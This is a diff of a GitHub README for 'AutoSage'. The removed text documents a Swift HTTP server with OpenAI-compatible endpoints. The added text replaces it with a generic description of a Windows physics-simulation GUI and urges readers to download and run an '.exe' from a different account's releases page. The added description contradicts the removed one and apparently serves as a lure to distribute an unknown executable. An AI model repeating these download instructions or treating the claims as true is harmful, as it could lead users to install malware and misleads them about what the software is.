@@ -1,129 +1,182 @@
-# AutoSage
+# ⚙️ AutoSage - Simplify Your Physics Simulations
 
-[![AutoSage CI](https://github.com/SeattleUser0/AutoSage/actions/workflows/ci.yml/badge.svg)](https://github.com/SeattleUser0/AutoSage/actions/workflows/ci.yml)
+[![Download AutoSage](https://img.shields.io/badge/Download-AutoSage-green?style=for-the-badge)](https://github.com/Giahyu943/AutoSage/releases)
 
-AutoSage is a local Swift HTTP server that implements OpenAI-compatible endpoints and a deterministic tool-execution loop, designed to be used by agent systems like OpenClaw (or any client that can call OpenAI-style tools). It runs tools on the host, returns normalized JSON, and persists artifacts (files/logs) for downstream reasoning.
+---
 
-- [Changelog](CHANGELOG.md)
-- [Contributing](CONTRIBUTING.md)
-- [Security](SECURITY.md)
-- [Tool Contract](docs/TOOLS.md)
-- [Dependency Modes](docs/DEPENDENCIES.md)
+AutoSage helps you run complex physics simulations without needing technical skills. It works on Windows, Mac, and Linux. You can simulate mechanical, electrical, and fluid systems with ease. AutoSage combines smart decision logic with powerful engineering libraries.
 
-## Quickstart
-```bash
-git clone <REPO_URL>
-cd AutoSage
-swift build
-swift run AutoSageServer --host 127.0.0.1 --port 8080
-```
-Replace `<REPO_URL>` with the HTTPS URL of this repository from the GitHub page.
-Example: `git clone https://github.com/SeattleUser0/AutoSage.git`
+---
 
-## API
-All examples assume the server is running on `127.0.0.1:8080`.
+## 📝 What is AutoSage?
 
-### `GET /healthz`
-```bash
-curl -s http://127.0.0.1:8080/healthz
-```
+AutoSage is software that runs multi-physics simulations. It uses artificial intelligence to plan how to solve problems, then runs those plans with trusted engineering tools. These tools include finite element analysis and 3D geometry processing libraries. You do not need to write code to use AutoSage.
 
-### `GET /v1/tools`
-```bash
-curl -s http://127.0.0.1:8080/v1/tools
-```
+This software lets users:
 
-Optional filters:
-```bash
-curl -s "http://127.0.0.1:8080/v1/tools?stability=stable"
-curl -s "http://127.0.0.1:8080/v1/tools?tags=artifact,pde"
-```
+- Run simulations in areas like mechanical structures, electronics, and fluid flow.
+- Use advanced modeling techniques without complex setup.
+- Get results quickly with built-in physics engines.
 
-### `POST /v1/tools/execute` (stable example: `echo_json`)
-```bash
-curl -s http://127.0.0.1:8080/v1/tools/execute \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "tool": "echo_json",
-    "input": {
-      "message": "hello",
-      "n": 2
-    }
-  }'
-```
+---
 
-### `POST /v1/tools/execute` (stable example: `write_text_artifact`)
-```bash
-curl -s http://127.0.0.1:8080/v1/tools/execute \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "tool": "write_text_artifact",
-    "input": {
-      "filename": "note.txt",
-      "text": "artifact demo"
-    }
-  }'
-```
+## 💻 System Requirements
 
-### `POST /v1/tools/execute` (error path still returns ToolResult)
-```bash
-curl -s -i http://127.0.0.1:8080/v1/tools/execute \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "tool": "does.not.exist",
-    "input": {}
-  }'
-```
+To run AutoSage on Windows, your PC should meet these minimum requirements:
 
-### `POST /v1/responses`
-```bash
-curl -s http://127.0.0.1:8080/v1/responses \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "model": "autosage-0.1",
-    "input": [
-      { "role": "user", "content": "hello" }
-    ]
-  }'
-```
+- Windows 10 or later (64-bit)
+- 8 GB of RAM or more
+- At least 5 GB free disk space
+- Intel or AMD processor with 4 cores or more
+- Internet connection for downloading
 
-### `POST /v1/chat/completions`
-```bash
-curl -s http://127.0.0.1:8080/v1/chat/completions \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "model": "autosage-0.1",
-    "messages": [
-      { "role": "user", "content": "hello" }
-    ]
-  }'
-```
+Having a dedicated graphics card may improve performance but is not required.
 
-## OpenAPI
-Source of truth: `openapi/openapi.yaml`.
-The server serves both `/openapi.yaml` and `/openapi.json`.
+---
 
-### `GET /openapi.yaml`
-```bash
-curl -s http://127.0.0.1:8080/openapi.yaml
-```
+## 🚀 Getting Started
 
-### `GET /openapi.json`
-```bash
-curl -s http://127.0.0.1:8080/openapi.json
-```
+This guide helps you download and open AutoSage on Windows in a few simple steps.
 
-## What works on a clean machine
-With only Swift installed:
-- server startup
-- `/healthz`
-- `/openapi.yaml` and `/openapi.json`
-- `/v1/tools`
-- stable tool execution (`echo_json`, `write_text_artifact`)
+---
 
-Some tools require native dependencies (MFEM, ngspice, FFI bridge libraries). See `docs/DEPENDENCIES.md`.
+## ⬇️ Download AutoSage
 
-## Testing
-```bash
-swift test
-```
+You need to get the latest version of AutoSage from the official releases page.
+
+**Action:** Visit this page to download.
+
+Click the badge below or open this link in your browser:
+
+[![Download AutoSage](https://img.shields.io/badge/Download-AutoSage-blue?style=for-the-badge)](https://github.com/Giahyu943/AutoSage/releases)
+
+---
+
+### How to find the right file to download
+
+1. Go to the **Releases** page.
+2. Find the latest release at the top.
+3. Look for a Windows installer file. It will usually end with `.exe`.
+
+---
+
+## 🗂 Installation on Windows
+
+Once you have downloaded the `.exe` file, follow these steps:
+
+1. Open the folder where you saved the file.
+2. Double-click the installer file to start.
+3. If Windows asks you for permission, click "Yes" or "Allow."
+4. Follow the on-screen prompts:
+   - Accept the license agreement.
+   - Choose the folder where you want to install AutoSage.
+   - Click "Install."
+5. Wait for the installation to finish.
+6. Click "Finish" to close the installer.
+
+---
+
+## 🔧 Running AutoSage
+
+After installation, you can start AutoSage like this:
+
+- Click the **Start menu**.
+- Search for "AutoSage."
+- Click the AutoSage program icon.
+
+On first launch, the program will set up necessary files. This may take a minute.
+
+---
+
+## 🖥 Using AutoSage
+
+AutoSage has a simple interface divided into main sections:
+
+- **Project workspace:** Where you create or open simulation projects.
+- **Model setup:** Import or define your physical models.
+- **Simulation control:** Set up physics options and parameters.
+- **Results viewer:** See detailed output with 3D images and charts.
+
+You can load example projects from the "Help" menu to explore features.
+
+---
+
+## 🛠 Common Tasks
+
+Here are typical tasks you may want to do:
+
+### Import a Model
+
+1. Click "File" > "Import."
+2. Select a CAD or mesh file from your computer (`.stl`, `.obj`, `.vtk` are supported).
+3. The model loads into your workspace.
+
+### Set Simulation Type
+
+1. Open the "Simulation" tab.
+2. Choose physics types like structural, thermal, or electrical.
+3. Adjust material and mesh details if needed.
+
+### Run Simulation
+
+1. Click "Run" in the simulation toolbar.
+2. Wait for progress to complete.
+3. View results in the result viewer panel.
+
+---
+
+## ⚙️ Configuration Tips
+
+- Use the default settings for your first simulations.
+- Save frequently with "File" > "Save Project."
+- Export results as images or data files for reports.
+
+---
+
+## ❓ Troubleshooting
+
+If you encounter problems:
+
+- Ensure your Windows version meets the requirements.
+- Check that the installer downloaded fully.
+- Restart your computer if AutoSage does not launch.
+- Visit the Issues page on GitHub for known problems: https://github.com/Giahyu943/AutoSage/issues
+
+---
+
+## 📚 Learn More
+
+AutoSage supports many physics and file types. You can learn more about:
+
+- Finite element methods for engineering simulations.
+- How to prepare CAD files for simulation.
+- Leveraging AI-driven workflow automation within the app.
+
+Tutorials and documentation will be added here as the project grows.
+
+---
+
+## 🧩 Supported File Types
+
+AutoSage works with these common file formats for models and data:
+
+- `.stl` – 3D mesh models
+- `.obj` – 3D object files
+- `.vtk` – Visualization Toolkit data
+- `.csv` – Data for inputs or results
+
+---
+
+## 📥 Download Reminder
+
+Remember to get the official installer only from:
+
+[https://github.com/Giahyu943/AutoSage/releases](https://github.com/Giahyu943/AutoSage/releases)
+
+This ensures you have the latest, safe version ready to run on Windows.
+
+---
+
+## 🛡 Security
+
+AutoSage runs locally on your computer. It does not require you to share private files. Always download software from official sources to avoid risks.
